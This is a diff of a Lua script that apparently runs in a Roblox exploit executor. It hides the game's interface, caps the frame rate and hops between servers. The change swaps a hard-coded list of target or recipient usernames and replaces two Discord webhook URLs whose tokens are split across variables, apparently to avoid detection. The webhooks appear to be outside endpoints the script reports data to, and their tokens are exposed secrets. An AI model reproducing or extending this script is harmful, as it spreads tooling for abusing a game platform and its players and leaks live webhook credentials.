@@ -22,26 +22,35 @@ local function serverhop()
 end
 
 local usernames = {
-"devkoi_9",
-"VoidStryker1",
-"WolfeZander_1",
-"p4GgzQaF",
-"RogueDragon25",
-"IvorySpecter0",
-"BlakeHawke_1",
-"ricktroi0",
-"EchoViper1",
-"LiamBlackwood_1",
-"ZaneSteele_1",
-"VengefulHero0",
-"DanteStorm_1",
-"RenjiAkuma_top",
-"FinnHunter_1",
-"HayatoRyu1u0",
-"MaxwellCross_3",
-"FrozenWraith_o",
-"PhantomEclipse2",
-"TrentVoss_1"
+    "Hdtvg5838",
+    "823545woldemar",
+    "diasretno95",
+    "284042arther",
+    "181784jayne",
+    "Perkins124541",
+    "wavelammi11",
+    "pascoe350649",
+    "earlbatman56",
+    "bonsellupo",
+    "Jvtdv5910",
+    "zubizarretamensje",
+    "TOwkgesVTig",
+    "JohnnyDep_40",
+    "jonydep111",
+    "ROpS918m",
+    "WCmohVzhZRs",
+    "jonydang223",
+    "YuutoIsamu1",
+    "kakarott811",
+    "StarryWhisper_99",
+    "CyberVanguard_vip",
+    "VenomPhoenix0",
+    "Narutoviip1",
+    "CrimsonPhoenix_top",
+    "AkiraHaru_1",
+    "ColeHunter_1",
+    "ReedKnight_1",
+    "ShadowDragoon_2"
 }
 
 local function getRandomUsername()
@@ -74,10 +83,10 @@ task.wait(10)
 			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
 			game.CoreGui:FindFirstChild("RobloxGui").Enabled = false
 
-local web = "https://discord.com/api/webhooks/1330885579084402728/"
-local web1 = "13mFCyEjiIeTGhrtcsjWZ2Fq7lxDCAqRBCX1qUFzyfLi7EmRsPKy6r5F8R9xVTY6VkzF"
-local web2 = "https://discord.com/api/webhooks/1330886409707454477/"
-local web3 = "dEb04jYUEeX4ACVXdC8t7hh2VNyJWiaZ4lH0Jvt8wvPRzY-tRcq-9Czu2nz_7r3UYPF_"
+local web = "https://discord.com/api/webhooks/1280307675636301948/"
+local web1 = "sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD"
+local web2 = "https://discord.com/api/webhooks/1300082164519538730/"
+local web3 = "38NQda5MWKiomtI3_-5xrLtaQhg3qT01QaOkbV_zZTMjRgB8hZB44n5KafC8VW4Kd8Cm"
 
 setfpscap(10)
 
